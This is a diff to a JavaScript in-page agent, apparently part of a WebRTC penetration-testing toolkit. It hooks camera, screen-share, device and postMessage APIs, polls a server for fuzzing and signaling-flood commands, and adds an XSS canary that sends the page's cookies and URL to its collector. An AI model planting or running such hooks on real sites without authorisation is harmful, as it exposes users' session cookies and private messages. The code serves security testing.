@@ -14,7 +14,7 @@
   var COLLECT = CFG.collect;
   var COMMAND = CFG.command;
   var FRAME = (function () { try { return location.href; } catch (e) { return "frame"; } })();
-  var AGENT_VERSION = "1.1.1";
+  var AGENT_VERSION = "1.2.0";
   var AGENT_ID = "agent-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2);
   var NativePeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;
   var channels = new Map();
@@ -117,7 +117,9 @@
           " signaling=" + snapshot.signalingState + " SCTP=" + snapshot.sctpState;
         beacon(snapshot);
         if (pc.connectionState === "closed" || pc.signalingState === "closed") {
-          clearTimeout(statsTimer); statsTimer = null; statsLeft = 0; return;
+          clearTimeout(statsTimer); statsTimer = null; statsLeft = 0;
+          checkCaptureAfterClose(pcId);
+          return;
         }
         if (pc.connectionState === "connected" || pc.iceConnectionState === "connected" || pc.iceConnectionState === "completed") {
           if (statsLeft <= 0) { statsLeft = STATS_MAX; statsTaken = 0; sampleStats(); }
@@ -134,6 +136,7 @@
         event.detail = "RTCPeerConnection.close() called by page";
         event.stack = String(new Error().stack || "").slice(0, 2048);
         beacon(event);
+        checkCaptureAfterClose(pcId);
         return result;
       };
 
@@ -568,8 +571,63 @@
     }).catch(function () {});
   }
 
+  // Capture tracks obtained by the page (camera, microphone, screen). Only the
+  // kind, source and lifecycle are recorded; never media contents or device labels.
+  var captureTracks = [];
+  var captureSeq = 0;
+
+  function trackCapture(stream, source) {
+    try {
+      var tracks = stream && typeof stream.getTracks === "function" ? stream.getTracks() : [];
+      tracks.forEach(function (track) {
+        if (!track) return;
+        var settings = {};
+        try { settings = typeof track.getSettings === "function" ? track.getSettings() || {} : {}; } catch (e) {}
+        var entry = { id: "cap" + (++captureSeq), track: track, kind: track.kind || "", source: source,
+          displaySurface: settings.displaySurface || "", startedAt: Date.now() };
+        captureTracks.push(entry);
+        if (captureTracks.length > 64) captureTracks.shift();
+        beacon({ type: "track-state", captureId: entry.id, kind: entry.kind, source: source, state: track.readyState || "live",
+          displaySurface: entry.displaySurface, detail: source + " " + entry.kind + " track started" +
+            (entry.displaySurface ? " (surface " + entry.displaySurface + ")" : "") });
+        var origStop = track.stop;
+        if (typeof origStop === "function") track.stop = function () {
+          var result = origStop.apply(track, arguments);
+          beacon({ type: "track-state", captureId: entry.id, kind: entry.kind, source: source, state: "ended", action: "stop-called",
+            elapsedMs: Date.now() - entry.startedAt, detail: source + " " + entry.kind + " track stopped by page" });
+          return result;
+        };
+        if (typeof track.addEventListener === "function") track.addEventListener("ended", function () {
+          beacon({ type: "track-state", captureId: entry.id, kind: entry.kind, source: source, state: "ended", action: "ended-event",
+            elapsedMs: Date.now() - entry.startedAt, detail: source + " " + entry.kind + " track ended (browser or user stopped capture)" });
+        });
+      });
+    } catch (e) {}
+  }
+
+  // After a page-closed peer, check whether capture devices stay live with no open
+  // peer left. A live camera, microphone or screen after hang-up is a privacy lead.
+  function checkCaptureAfterClose(pcId) {
+    setTimeout(function () {
+      try {
+        var openPeers = peersSeen.filter(function (entry) {
+          return entry.pc.connectionState !== "closed" && entry.pc.signalingState !== "closed";
+        }).length;
+        if (openPeers > 0) return;
+        captureTracks.forEach(function (entry) {
+          if (entry.track.readyState !== "live" || entry.reportedAfterClose) return;
+          entry.reportedAfterClose = true;
+          beacon({ type: "track-state", captureId: entry.id, kind: entry.kind, source: entry.source, state: "live",
+            action: "live-after-close", closedPc: pcId, displaySurface: entry.displaySurface,
+            detail: entry.source + " " + entry.kind + " capture is still live 3 s after the last peer connection closed" });
+        });
+      } catch (e) {}
+    }, 3000);
+  }
+
   function wrapGetUserMedia() {
-    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    if (!navigator.mediaDevices) return;
+    if (navigator.mediaDevices.getUserMedia) {
       var orig = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
       navigator.mediaDevices.getUserMedia = function (constraints) {
         beacon({ type: "getUserMedia", constraints: safeJson(constraints) });
@@ -582,14 +640,170 @@
         }
         // Observe only the outcome and browser error; never collect track data,
         // device labels, or media contents.
-        request.then(function () {
+        request.then(function (stream) {
           beacon({ type: "getUserMedia-result", outcome: "resolved" });
+          trackCapture(stream, "camera/microphone");
         }, function (error) {
           beacon({ type: "getUserMedia-result", outcome: "rejected", error: cleanError(error) });
         });
         return request;
       };
     }
+    if (navigator.mediaDevices.getDisplayMedia) {
+      var origDisplay = navigator.mediaDevices.getDisplayMedia.bind(navigator.mediaDevices);
+      navigator.mediaDevices.getDisplayMedia = function (constraints) {
+        beacon({ type: "getDisplayMedia", constraints: safeJson(constraints), detail: "Screen share requested: " + safeJson(constraints) });
+        var request;
+        try {
+          request = origDisplay(constraints);
+        } catch (error) {
+          beacon({ type: "capture-result", source: "screen", outcome: "rejected", error: cleanError(error), detail: "Screen share rejected: " + cleanError(error) });
+          throw error;
+        }
+        request.then(function (stream) {
+          var surfaces = [];
+          try {
+            stream.getVideoTracks().forEach(function (track) {
+              var s = typeof track.getSettings === "function" ? track.getSettings() || {} : {};
+              if (s.displaySurface) surfaces.push(s.displaySurface);
+            });
+          } catch (e) {}
+          beacon({ type: "capture-result", source: "screen", outcome: "resolved", displaySurfaces: surfaces,
+            detail: "Screen share granted" + (surfaces.length ? " (surface " + surfaces.join(", ") + ")" : "") });
+          trackCapture(stream, "screen");
+        }, function (error) {
+          beacon({ type: "capture-result", source: "screen", outcome: "rejected", error: cleanError(error), detail: "Screen share rejected: " + cleanError(error) });
+        });
+        return request;
+      };
+    }
+    if (navigator.mediaDevices.enumerateDevices) {
+      var origEnumerate = navigator.mediaDevices.enumerateDevices.bind(navigator.mediaDevices);
+      var enumerations = 0;
+      navigator.mediaDevices.enumerateDevices = function () {
+        var request = origEnumerate.apply(null, arguments);
+        if (++enumerations <= 5) Promise.resolve(request).then(function (devices) {
+          var counts = {}, labelled = 0;
+          (devices || []).forEach(function (d) {
+            counts[d.kind] = (counts[d.kind] || 0) + 1;
+            if (d.label) labelled++;
+          });
+          // Device labels are hardware names; record only whether the page can see them.
+          beacon({ type: "enumerateDevices-result", counts: counts, labelsExposed: labelled > 0, devices: (devices || []).length,
+            detail: "enumerateDevices returned " + (devices || []).length + " device(s); labels " + (labelled ? "exposed" : "hidden") });
+        }, function () {});
+        return request;
+      };
+    }
+  }
+
+  // Stored-XSS canaries: payloads generated in Burp call this function. When a
+  // payload executes in any instrumented page (for example an advisor console),
+  // the beacon proves script execution in that page and origin.
+  function installCanary() {
+    var fired = {};
+    function canary(id, context) {
+      try {
+        id = String(id || "").replace(/[^A-Za-z0-9]/g, "").slice(0, 32);
+        if (!id || fired[id]) return;
+        fired[id] = true;
+        var cookies = "";
+        try { cookies = document.cookie; } catch (e) {}
+        var origin = "";
+        try { origin = location.origin; } catch (e) {}
+        beacon({ type: "xss-canary-fired", canaryId: id, context: String(context || "").slice(0, 64), origin: origin,
+          href: (function () { try { return location.href; } catch (e) { return ""; } })(),
+          readableCookies: cookies, stack: String(new Error().stack || "").slice(0, 2048),
+          detail: "XSS canary " + id + " executed in " + origin });
+      } catch (e) {}
+    }
+    try { Object.defineProperty(window, "__wrtcCanary", { value: canary, configurable: false, enumerable: false, writable: false }); }
+    catch (e) { try { window.__wrtcCanary = canary; } catch (ignored) {} }
+  }
+
+  // Cross-window messaging: log message listeners (with a heuristic for origin
+  // checks), the first messages per origin, and outgoing wildcard-target posts.
+  function wrapMessaging() {
+    if (typeof window.addEventListener !== "function") return;
+    var listenerCount = 0, received = {}, sent = 0;
+    function selfOrigin() { try { return location.origin; } catch (e) { return ""; } }
+    function preview(data) {
+      try { return (typeof data === "string" ? data : JSON.stringify(data)).slice(0, 512); } catch (e) { return "[unserializable]"; }
+    }
+    function source(fn) { try { return Function.prototype.toString.call(fn).slice(0, 2048); } catch (e) { return ""; } }
+    function observeListener(fn, how) {
+      if (typeof fn !== "function" || ++listenerCount > 20) return;
+      var text = source(fn);
+      var checks = /\.origin\b/.test(text);
+      beacon({ type: "message-listener", how: how, checksOrigin: checks, source: text,
+        detail: "message listener registered via " + how + (checks ? " (references event.origin)" : " (no event.origin reference found)") });
+    }
+    function observeMessage(event) {
+      try {
+        var origin = String(event.origin || "");
+        received[origin] = (received[origin] || 0) + 1;
+        if (received[origin] > 3) return;
+        beacon({ type: "message-received", origin: origin, sameOrigin: origin === selfOrigin(), data: preview(event.data),
+          detail: "postMessage received from " + (origin || "(opaque)") });
+      } catch (e) {}
+    }
+    var nativeAdd = window.addEventListener;
+    try {
+      window.addEventListener = function (type, listener) {
+        if (type === "message") observeListener(listener && listener.handleEvent ? listener.handleEvent : listener, "addEventListener");
+        return nativeAdd.apply(this, arguments);
+      };
+      nativeAdd.call(window, "message", observeMessage, true);
+    } catch (e) {}
+    try {
+      var descriptor = Object.getOwnPropertyDescriptor(window, "onmessage");
+      if (descriptor && descriptor.configurable && descriptor.set) Object.defineProperty(window, "onmessage", {
+        configurable: true, enumerable: descriptor.enumerable,
+        get: function () { return descriptor.get ? descriptor.get.call(window) : null; },
+        set: function (fn) { observeListener(fn, "onmessage"); descriptor.set.call(window, fn); }
+      });
+    } catch (e) {}
+    try {
+      var nativePost = window.postMessage;
+      if (typeof nativePost === "function") window.postMessage = function (message, target) {
+        var targetOrigin = typeof target === "string" ? target : (target && target.targetOrigin) || "/";
+        if (targetOrigin === "*" && ++sent <= 10) beacon({ type: "message-sent", targetOrigin: targetOrigin, data: preview(message),
+          detail: "postMessage sent with wildcard target origin" });
+        return nativePost.apply(this, arguments);
+      };
+    } catch (e) {}
+  }
+
+  // Browser capability snapshot for permission and capture review. No media is captured.
+  async function runBrowserChecks(command) {
+    var result = { secureContext: !!window.isSecureContext, crossOriginIsolated: !!window.crossOriginIsolated, permissions: {}, policy: {} };
+    var md = navigator.mediaDevices;
+    result.getDisplayMedia = !!(md && md.getDisplayMedia);
+    try { result.supportedConstraints = md && md.getSupportedConstraints ? Object.keys(md.getSupportedConstraints()).length : 0; } catch (e) {}
+    try {
+      if (md && md.enumerateDevices) {
+        var devices = await md.enumerateDevices(), counts = {}, labelled = 0;
+        devices.forEach(function (d) { counts[d.kind] = (counts[d.kind] || 0) + 1; if (d.label) labelled++; });
+        result.devices = counts; result.labelsExposed = labelled > 0;
+      }
+    } catch (e) { result.devicesError = cleanError(e); }
+    var names = ["camera", "microphone", "display-capture"];
+    for (var i = 0; i < names.length; i++) {
+      if (!await authorized(command)) return "cancelled";
+      try {
+        if (navigator.permissions && navigator.permissions.query) result.permissions[names[i]] = (await navigator.permissions.query({ name: names[i] })).state;
+      } catch (e) { result.permissions[names[i]] = "unsupported"; }
+      try {
+        var policy = typeof document !== "undefined" && (document.permissionsPolicy || document.featurePolicy);
+        if (policy && policy.allowsFeature) result.policy[names[i]] = policy.allowsFeature(names[i]);
+      } catch (e) {}
+    }
+    try { result.framed = window.top !== window; } catch (e) { result.framed = true; }
+    result.type = "browser-capabilities"; result.commandId = command.id;
+    result.detail = "secureContext=" + result.secureContext + " framed=" + result.framed + " permissions=" + safeJson(result.permissions) +
+      " policy=" + safeJson(result.policy) + " labelsExposed=" + result.labelsExposed;
+    beacon(result);
+    return "completed";
   }
 
   function sizeOf(data) {
@@ -616,7 +830,7 @@
           if (!doc || !Array.isArray(doc.commands)) return;
           doc.commands.filter(function (c) {
             return c.type === "dc-fuzz" || c.type === "ice-probe" || c.type === "sdp-fuzz" ||
-              c.type === "capture-stats" || c.type === "signaling-flood";
+              c.type === "capture-stats" || c.type === "signaling-flood" || c.type === "browser-checks";
           }).forEach(dispatchCommand);
         })
         .catch(function () {})
@@ -655,12 +869,14 @@
       if (command.type === "sdp-fuzz") return runSdpFuzz(command);
       if (command.type === "capture-stats") return runCaptureStats(command);
       if (command.type === "signaling-flood") return runSignalingFlood(command);
+      if (command.type === "browser-checks") return runBrowserChecks(command);
       return runIceProbe(command);
     }).catch(function (e) {
       var errType = command.type === "dc-fuzz" ? "fuzz-error"
         : command.type === "sdp-fuzz" ? "sdp-fuzz-error"
         : command.type === "capture-stats" ? "stats-capture-error"
         : command.type === "signaling-flood" ? "signaling-flood-error"
+        : command.type === "browser-checks" ? "browser-checks-error"
         : "ice-probe-error";
       var errorEvent = { type: errType, commandId: command.id, detail: cleanError(e) };
       if (errType === "ice-probe-error") iceProbeEvent(command, errorEvent); else beacon(errorEvent);
@@ -683,6 +899,10 @@
 
   function fuzzPayload(cfg, index) {
     if (cfg.mode === "text") return cfg.payload;
+    if (cfg.mode === "list") {
+      if (!Array.isArray(cfg.payloads) || !cfg.payloads.length || cfg.payloads.length > 50) throw new Error("Invalid payload list");
+      return String(cfg.payloads[index % cfg.payloads.length]);
+    }
     if (cfg.mode === "hex") {
       var hex = cfg.payload.replace(/\s/g, "");
       if (!/^(?:[0-9a-fA-F]{2})*$/.test(hex)) throw new Error("Invalid hex payload");
@@ -998,6 +1218,8 @@
 
   try { wrapPeerConnection(); } catch (e) {}
   try { wrapGetUserMedia(); } catch (e) {}
+  try { installCanary(); } catch (e) {}
+  try { wrapMessaging(); } catch (e) {}
   beacon({ type: "installed", detail: "agent " + AGENT_VERSION, private: false });
   if (typeof window.addEventListener === "function") window.addEventListener("pagehide", function () { unloading = true; });
   pollCommands();
